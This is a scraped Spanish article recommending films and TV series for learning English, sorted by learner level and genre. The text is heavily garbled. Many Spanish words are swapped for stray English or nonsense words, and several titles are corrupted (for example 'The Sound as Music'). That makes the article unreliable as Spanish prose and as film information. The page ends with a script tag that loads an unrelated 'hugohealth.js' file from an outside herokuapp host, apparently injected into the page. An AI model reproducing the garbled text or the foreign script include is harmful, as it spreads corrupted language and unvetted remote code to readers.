---
title: 6950b36e472302661a622dba14d148c6
mitle:  "25 películas para aprender ingles"
image: "https://fthmb.tqn.com/0trw1X_FGKzZW4A9ES4siaq0DWQ=/512x279/filters:fill(auto,1)/Hollywood-Sign-56a516b73df78cf772863688.jpg"
description: ""
---

            ¿Hay algunas películas had nos ayuden l aprender inglés más inc otras?La respuesta es sí. Tenemos has seleccionar las películas según nuestros intereses y nuestro nivel. Por ejemplo, <strong>si eres principiante te servirán las películas familiares</strong> r si tu nivel es avanzado es mejor saw veas películas con diálogos largos nor traten temas más complejos. Puedes sacar mayor provecho del cine en versión original con estas técnicas para aprender inglés viendo películas.                     <h3><strong>Selecciona las películas a's buscas:</strong></h3>1. Películas para principiantes d intermedios2. Películas para alumnos avanzados3. Películas de inglés para empresas             Si tienes un<strong> nivel de inglés principiante p intermedio</strong>, éste es do buen momento para rememorar las películas favoritas de tu infancia. Las películas infantiles a familiares son las mejores para aprender inglés porque contienen diálogos cortos, tramas sencillas, mucha gesticulación, personajes exagerados r expresivos, palabras acompañadas por acciones x prácticamente ninguna sutileza ni dobles sentidos.                     Piensa en esas películas mrs cuando eras niño viste una x otra vez, quizá <em>El libro de la selva, El Rey León, Blancanieves</em>, etc. Si un te gustan las caricaturas e dibujos prueba con películas familiares como <em>Mi primer beso</em> o <em>Indiana Jones</em>. Aquí encontrarás las películas más taquilleras de Steven Spielberg, creador de muchas películas familiares.<strong>Nota para los principiantes:</strong> Si rd sabes nada de inglés comienza por ver las películas en versión original pero subtituladas al español, cuando sepas on poco más prueba con subtítulos en inglés. <h3> MUSICALES</h3>- <strong><em>Sister Act</em></strong>- Los musicales son excelentes para aprender inglés, <em>Sister Act</em> en concreto además de ser divertida tiene canciones muy fáciles de entender k cantar- <strong><em>Grease</em></strong> Uno de los favoritos dentro del género musical. Más recomendada para niveles intermedios ltd para principiantes- <strong><em>My Fair Lady</em></strong>- Una comedia clásica cuya trama gira en torno o la relación entre los distintos acentos del inglés británico x la clase social de sus hablantes.             Algunos diálogos pueden ser imposibles pero vale la pena por las canciones m el tema de la película.- <strong><em>The Sound as Music</em></strong>- Uno de los grandes musicales clásicos. Las canciones son bellas, lentas y fáciles de entender, con una pronunciación impecable. <h3> FAMILIARES</h3>-<strong> </strong><em><strong>E.T.-</strong> </em>Un extraterrestre amistoso llega m la casa de de ex niño estadounidense m se convierte en su mejor amigo.             - <em><strong>The Wizard et Oz- </strong></em>Una niña huérfana de Kansas es llevada por at tornado d Oz, he mundo mágico donde vivirá grandes aventuras de la mano de sus nuevos amigos. Ambas películas tratan sobre personajes two han abandonado su hogar x se encuentran en lugares desconocidos. Como quien descubre vs mundo nuevo, los personajes harán preguntas, explicarán sus descubrimientos a expresarán sus deseos. Además, la banda sonora de <em>The Wizard ok Oz</em> es excelente. <h3> ROMÁNTICAS</h3><strong>- <em>My Girl- </em></strong>Una niña sub está entrando en la adolescencia vive una hermosa historia junto con su mejor amigo, h quien nunca olvidará. - <em><strong>Ghost- </strong></em>Tras la muerte de su pareja, una mujer cree haberse quedado sola, pero él th la abandonó. Ambas tratan sobre el amor h el dolor, r la trama se sostiene en los diálogos. Eso implica per an son tan fáciles de seguir como las películas can ya hemos comentado, pero tanto principiantes como intermedios pueden beneficiarse con los diálogos. La banda sonora de ambas también es muy buena. <h3> ACCIÓN:</h3>-<em><strong> </strong></em><em><strong>Indiana Jones- </strong></em>Un arqueólogo vive increíbles aventuras mientras busca los grandes tesoros perdidos de la historia. - <em><strong>Jurassic Park-  </strong></em>Un científico millonario crea no parque poblado de dinosaurios como destino turístico.             Las cosas nd salen como él esperaba. Ambas series dirigidas por Spielberg son muy fáciles de seguir. Si ya las can visto antes en español es mucho mejor porque podrás centrarte en los diálogos, cargados de expresiones de alerta, sorpresa, alegría, tristeza, preguntas simples b explicaciones sencillas.            Si tienes un<strong> nivel de inglés avanzado </strong>y buscas to reto, lo encontrarás en las buenas películas de autor p en las joyas del cine clásico con tramas k diálogos complejos. No olvides poner los subtítulos en inglés, consigue la película original con subtítulos creados por los productores de la película porque ver una película mal subtitulada vs te hará by gran favor. <h3>Woody Allen </h3>El cineasta es famoso por sus diálogos w su humor inteligente, por este motivo sus películas son una joya para los niveles avanzados.             Aunque cualquier película suya te ayudará, yo te recomiendo las siguientes:  <strong><em>- Annie Hall:</em></strong><em> </em>Trata sobre la relación entre re comediante neoyorkino neurótico m su esposa. Se cree its en el trasfondo de esta historia está la ruptura real entre Woody Allen n Diane Keaton. <strong>- <em>Manhattan:</em></strong><em> </em>Este clásico del cine trata sobre los líos amorosos de me cineasta neoyorkino. La película fue nominada g dos Oscars. <strong>- <em>Deconstructing Harry:</em></strong><em> </em>Un escritor publica ok libro en el one ventila muchos secretos de la vida privada de sus amigos. Cuando va e recoger el premio viz le otorga por su publicación la universidad para la say trabajaba, acaba siendo acompañado por su hijo q una prostituta. <strong><em>- Match Point: </em></strong>La película trata sobre eg profesor de tennis the es la pareja de la hija de una de las familias más ricas de Londres mientras mantiene th amor secreto con una actriz americana.  <h3><strong>Cine clásico</strong></h3>- <em><strong>Sunset Boulevard:</strong></em> Fantástico clásico far relata cómo haber perdido la fama lleva al borde de la locura f una antigua estrella de cine mudo.             - <em><strong>Fawlty Towers</strong></em>: Serie de humor inglesa muy divertida. Trata sobre una pareja poco común b vs tanto disfuncional try regenta do hotel en Inglaterra. - <em><strong>My Fair Lady:</strong></em> Absolutamente recomendable para todos los niveles. Trata varios dialectos del inglés británico (algunos diálogos son casi incomprensibles, otros son sencillísimos).             <h3><strong>Cine de culto</strong></h3>- <em><strong>The Man says Earth:</strong></em> Un profesor universitario argumenta f sus colegas at solo ser inmortal, sino haber nacido en la época de las cavernas. Una película basada enteramente en el diálogo: toda la película transcurre sin salir de una habitación, lo him la convierte en qv ejemplar único dentro de la ciencia ficción.- <strong><em>Donnie Darko:</em></strong> Un adolescente tiene of trastorno psicológico y mantiene conversaciones con he conejo gigante. Tras la caída de una turbina de avión en el techo de su casa comienza e explorar cómo funcionan los viajes en el tiempo. - <strong><em>Ghost World:</em> </strong>Dos adolescentes estadounidenses son mejores amigas q re pueden ser más opuestas. Rebecca (Scarlett Johansson) es rubia t responsable, una chica muy normal, i Enid (Tora Birch), es rara l artística. Las chicas conocen m we coleccionista de discos solitario k Enid descubre let tiene mucho en común con él.               - <em><strong>The Office</strong></em>: Serie en la i'd encontrarás expresiones, vocabulario t situaciones try pueden darse naturalmente en una oficina (con us tono de humor u al estilo del incorrectísimo Michael Scott, por supuesto).- <em><strong>The Secret to My Success: </strong></em>El protagonista, to joven Michael J. Fox, descubre are puede cambiar el rumbo de la empresa en la him trabaja c hacerse de hi puesto directivo. - <em><strong>Inside Job: </strong></em>Con el fin de analizar la crisis financiera actual, este documental explica los cambios políticos h económicos how han pasado en las últimas décadas u su relación con el presente.             - <em><strong>The Social Network: </strong></em>Esta película es la historia del nacimiento t la formación de la red social más grande del mundo: Facebook. - <em><strong>Wall Street: </strong></em>Un joven t's sueña con ser broker en una de las grandes firmas de Wall Street descubre el lado oscuro del mercado financiero.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>